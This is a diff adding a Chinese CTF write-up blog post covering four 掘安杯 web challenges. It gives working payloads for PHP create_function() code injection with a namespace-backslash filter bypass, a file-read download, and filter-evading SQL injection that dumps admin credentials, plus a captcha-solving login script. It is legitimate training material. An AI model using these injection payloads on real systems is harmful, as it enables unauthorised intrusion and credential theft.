@@ -79,14 +79,34 @@
 
 
 
+<meta name="description" content="掘安杯ctf复现">
 <meta property="og:type" content="article">
 <meta property="og:title" content="掘安杯 writeup">
 <meta property="og:url" content="http://yoursite.com/2019/04/08/掘安杯-writeup/index.html">
 <meta property="og:site_name" content="九罹">
+<meta property="og:description" content="掘安杯ctf复现">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-04-08T10:20:47.912Z">
+<meta property="og:image" content="http://yoursite.com/2019/04/08/掘安杯-writeup/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/08/掘安杯-writeup/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/08/掘安杯-writeup/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/08/掘安杯-writeup/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/08/掘安杯-writeup/6.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/08/掘安杯-writeup/5.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/08/掘安杯-writeup/8.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/08/掘安杯-writeup/7.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/08/掘安杯-writeup/9.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/08/掘安杯-writeup/10.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/08/掘安杯-writeup/11.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/08/掘安杯-writeup/12.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/08/掘安杯-writeup/13.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/08/掘安杯-writeup/14.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/08/掘安杯-writeup/15.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/08/掘安杯-writeup/16.png">
+<meta property="og:updated_time" content="2019-04-09T12:02:43.946Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="掘安杯 writeup">
+<meta name="twitter:description" content="掘安杯ctf复现">
+<meta name="twitter:image" content="http://yoursite.com/2019/04/08/掘安杯-writeup/1.png">
 
 
 
@@ -299,6 +319,28 @@
           </span>
 
           
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeup/" itemprop="url" rel="index">
+                    <span itemprop="name">writeup</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -311,6 +353,10 @@
 
           
 
+          
+              <div class="post-description">
+                  掘安杯ctf复现
+              </div>
           
 
         </div>
@@ -326,7 +372,57 @@
       
 
       
-        
+        <h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h3><p>打开<code>flag在这里</code>的链接，是404界面<br>使用bp抓包<br><img src="1.png" alt="1"><br>进行base64解密，得flag: <span id="inline-red">jactf{jasafe110qweasdzxc}</span></p>
+<h3 id="not-easy"><a href="#not-easy" class="headerlink" title="not_easy"></a>not_easy</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&apos;action&apos;])) &#123;</span><br><span class="line">    $action = $_GET[&apos;action&apos;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;action&apos;]))&#123;</span><br><span class="line">    $arg = $_GET[&apos;arg&apos;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $action($arg,&apos;&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此题是create_function()代码注入的题目，create_function()代码注入学习链接<a href="https://blog.51cto.com/lovexm/1743442" target="_blank" rel="noopener">https://blog.51cto.com/lovexm/1743442</a></p>
+<h4 id="简单介绍create-function-代码注入"><a href="#简单介绍create-function-代码注入" class="headerlink" title="简单介绍create_function()代码注入"></a>简单介绍create_function()代码注入</h4><ol>
+<li><p>函数介绍<br>create_function(string $args, string $code);<br> $args : 变量部分 、 $code ： 方法代码部分<br> demo:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function(&apos;$a, $b&apos;, &apos;echo $a\*$b&apos;);</span><br></pre></td></tr></table></figure>
+<p> 等价于:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function fun($a,$b)&#123;</span><br><span class="line">	echo $a\*$b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>代码注入利用<br>测试环境版本：<br>apache +php 5.2、apache +php 5.3<br>有问题代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">$str2=&apos;echo  &apos;.$a.&apos;test&apos;.$id.&quot;;&quot;;</span><br><span class="line">echo $str2;</span><br><span class="line">echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &quot;==============================&quot;;</span><br><span class="line">echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">$f1 = create_function(&apos;$a&apos;,$str2);</span><br><span class="line">echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &quot;==============================&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p> 利用方法：//index.php?id=2;}phpinfo();/*<br> 实现原理：id=2;}phpinfo();/*<br> 执行函数为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">源代码：</span><br><span class="line">function fT($a) &#123;</span><br><span class="line">  echo &quot;test&quot;.$a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">注入后代码：</span><br><span class="line">function fT($a) &#123;</span><br><span class="line">  echo &quot;test&quot;;&#125;</span><br><span class="line">  phpinfo();/*;//此处为注入代码。</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>本题需要绕过对$action参数的正则过滤,<br><span id="inline-blue">在字母数字下划线都被过滤的情况下调用create_function(),思路是在开头或结尾绕过正则</span><br>可以使用bp进行fuzz发现在函数开头加上字符\(%5c)可以绕过，原因涉及到了php的全局命名空间，\create_function就是调用全局的create_function函数。</p>
+<ol>
+<li><p>利用create_function()代码注入执行命令<br><code>http://120.79.1.69:10006/?action=%5ccreate_function&amp;arg=){}phpinfo();//</code><br><img src="2.png" alt="2"></p>
+</li>
+<li><p>继续执行<br><code>http://120.79.1.69:10006/?action=%5ccreate_function&amp;arg=){}var_dump(scandir(&#39;./&#39;));//</code><br><img src="3.png" alt="3"></p>
+</li>
+<li><p>最后执行<br><code>http://120.79.1.69:10006/?action=%5ccreate_function&amp;arg=){}var_dump(file(&#39;Th1s_1S_F1a9_Hav3_Fun&#39;));//</code><br><img src="4.png" alt="4"></p>
+</li>
+</ol>
+<p>最终可得flag：<span id="inline-red">jactf{c795359da56ae38ec9132eaad24733fc} </span></p>
+<h3 id="下载下载"><a href="#下载下载" class="headerlink" title="下载下载"></a>下载下载</h3><p>点击链接下载了一个flag.txt，但是并没有什么用<br>查看源代码</p>
+<p><img src="6.png" alt="6"></p>
+<p>可以将这个flag.php下载下来<code>http://120.79.1.69:10002/index.php?file=flag.php</code><br>打开文件，在末尾可以发现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$key=&quot;MyCTF&quot;;</span><br><span class="line">$flag=&quot;o6lziae0xtaqoqCtmWqcaZuZfrd5pbI=&quot;;//encrypt($flag,$key)</span><br></pre></td></tr></table></figure></p>
+<p>放在本地进行decrypt()调用</p>
+<p><img src="5.png" alt="5"></p>
+<p>最终可得：<span id="inline-red">myCTF{cssohw456954GUEB}</span></p>
+<h3 id="曲折的人生"><a href="#曲折的人生" class="headerlink" title="曲折的人生"></a>曲折的人生</h3><p><img src="8.png" alt="8"></p>
+<p>由此可知存在sql注入，同时可知过滤了or 和空格，测试后可知还过滤了union,select<br>可使用双写绕过or,union,select的过滤,使用/**/绕过空格过滤</p>
+<p><img src="7.png" alt="7"></p>
+<p>可知回显位是2，然后进行爆库：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=-2%27/**/ununionion/**/sselectelect/**/1,database(),3#&amp;password=123&amp;code=123</span><br></pre></td></tr></table></figure></p>
+<p><img src="9.png" alt="9"></p>
+<p>爆表名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=-2%27/**/ununionion/**/sselectelect/**/1,(seselectlect/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()),3#&amp;password=123&amp;code=123</span><br></pre></td></tr></table></figure></p>
+<p><img src="10.png" alt="10"></p>
+<p>爆列名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=-2%27/**/ununionion/**/sselectelect/**/1,(seselectlect/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name=&apos;admin&apos;),3#&amp;password=123&amp;code=123</span><br></pre></td></tr></table></figure></p>
+<p><img src="11.png" alt="11"></p>
+<p>爆内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=-2%27/**/ununionion/**/sselectelect/**/1,(seselectlect/**/passwoorrd/**/from/**/xiaowei.admin),3#&amp;password=123&amp;code=123</span><br></pre></td></tr></table></figure></p>
+<p><img src="12.png" alt="12"><img src="13.png" alt="13"></p>
+<p>usernaem: goodboy_g-60Hellowoorr (注意or需要双写)<br>password: ajahas&amp;&amp;*44askldajaj<br>最终：<br><img src="14.png" alt="14"></p>
+<p>接下来就是编写计算验证码的脚本了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#-*- encoding: utf-8 -*-</span><br><span class="line">#在python3 下运行</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">username = &apos;goodboy_g-60Hellowoor&apos;</span><br><span class="line">password = &apos;ajahas&amp;&amp;\*44askldajaj&apos;</span><br><span class="line"></span><br><span class="line">get_url = &apos;http://120.79.1.69:10005/index.php&apos;</span><br><span class="line">post_url = get_url + &apos;?check&apos;</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">get = session.get(get_url)</span><br><span class="line">get.encoding = &apos;utf-8&apos;</span><br><span class="line">html = get.text</span><br><span class="line"></span><br><span class="line">#print(html)</span><br><span class="line"></span><br><span class="line">str = re.compile(r&apos;[X/]*[（0-9\+\-]+[）]+&apos;).findall(html)</span><br><span class="line">#print(str)</span><br><span class="line">num = &apos;&apos;</span><br><span class="line">for i in str:</span><br><span class="line">        num += i</span><br><span class="line">num = re.sub(&apos;（&apos;,&apos;(&apos;,num)</span><br><span class="line">num = re.sub(&apos;）&apos;, &apos;)&apos;,num)</span><br><span class="line">num = re.sub(&apos;X&apos;, &apos;*&apos;, num)</span><br><span class="line">print(num)</span><br><span class="line">if num:</span><br><span class="line">        vcode = int(eval(num))</span><br><span class="line">        print(&apos;num不为空&apos;)</span><br><span class="line">else:</span><br><span class="line">        print(&apos;num为空&apos;)</span><br><span class="line"></span><br><span class="line">post = session.post(post_url, data=&#123;&apos;uaername&apos;: username, &apos;password&apos;: password, &apos;code&apos;: vcode&#125;)</span><br><span class="line">post.encoding = &apos;utf-8&apos;</span><br><span class="line">print(post.text)</span><br></pre></td></tr></table></figure></p>
+<p><img src="15.png" alt="15"></p>
+<p>可以得到一个压缩包的下载链接，以及解压密码</p>
+<p><img src="16.png" alt="16"></p>
+<p>访问<code>http://120.79.1.69:10005/sss88ioiern.gdsgj.zip</code>下载压缩包并解压<br>有一个需要解压密码的flag.zip和一个Form1.txt<br>审计Form1.txt中的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">Private Function getPassword(ByVal str As String) As String</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Dim reString As String</span><br><span class="line">    </span><br><span class="line">    Dim i As Integer</span><br><span class="line">    i = 1</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    While (i &lt;= Len(str))</span><br><span class="line">    </span><br><span class="line">     reString = reString &amp; Mid(str, i, 1)</span><br><span class="line">     i = i + (i Mod 5)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    Wend</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    getPassword = reString</span><br><span class="line"></span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Private Sub Command1_Click()</span><br><span class="line"></span><br><span class="line">   Dim Dictionary As String</span><br><span class="line">    </span><br><span class="line">   Dictionary = &quot;VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU=&quot;</span><br><span class="line">   </span><br><span class="line">   Dim password As String</span><br><span class="line">   </span><br><span class="line">   password = getPassword(Dictionary)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   Dim psw As String</span><br><span class="line">   </span><br><span class="line">   psw = Text1.Text</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">   If (psw = password) Then</span><br><span class="line">   </span><br><span class="line">    MsgBox &quot;The password is correct!&quot;, vbOKOnly, &quot;密码正确&quot;</span><br><span class="line">    </span><br><span class="line">    Text1.Text = &quot;Password for next pass : &quot; &amp; getPassword(password)</span><br><span class="line">       </span><br><span class="line">   Else</span><br><span class="line">   </span><br><span class="line">    MsgBox &quot;PasswordFail!&quot;, vbOKOnly, &quot;密码错误&quot;</span><br><span class="line">    </span><br><span class="line">      </span><br><span class="line">   End If</span><br><span class="line">   </span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure></p>
+<p>将Form1.txt中的伪代码进行输出：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dict=&quot;VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU=&quot;</span><br><span class="line">def getpwd(str):</span><br><span class="line">    restr=&quot;&quot;</span><br><span class="line">    i=1</span><br><span class="line">    while i&lt;=len(str):</span><br><span class="line">        restr = restr+(str[i-1:i])</span><br><span class="line">        i=i+(i%5)</span><br><span class="line">    return restr</span><br><span class="line">passwd=getpwd(dict)</span><br><span class="line">pw=getpwd(passwd)</span><br><span class="line">print(pw)</span><br></pre></td></tr></table></figure></p>
+<p>运行得解压密码：<br>    <code>VmH0wW3DZalBnmmSalV1SYSGRr1r3jVYcFrHWkUUlhljkFzCbXaEKyaVJymT1FlVTVskVWhGtonaGU2WWGhVXYol1WVI1F2odFuk</code><br>将解压的flag.png修改后缀名为flag.txt，即可查看flag<br>最终可得：<span id="inline-red">flag{Good luck！}</span></p>
+
       
     </div>
     
@@ -410,8 +506,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -474,6 +579,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-number">1.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#web签到"><span class="nav-number">1.1.</span> <span class="nav-text">web签到</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#not-easy"><span class="nav-number">1.2.</span> <span class="nav-text">not_easy</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#简单介绍create-function-代码注入"><span class="nav-number">1.2.1.</span> <span class="nav-text">简单介绍create_function()代码注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#下载下载"><span class="nav-number">1.3.</span> <span class="nav-text">下载下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#曲折的人生"><span class="nav-number">1.4.</span> <span class="nav-text">曲折的人生</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
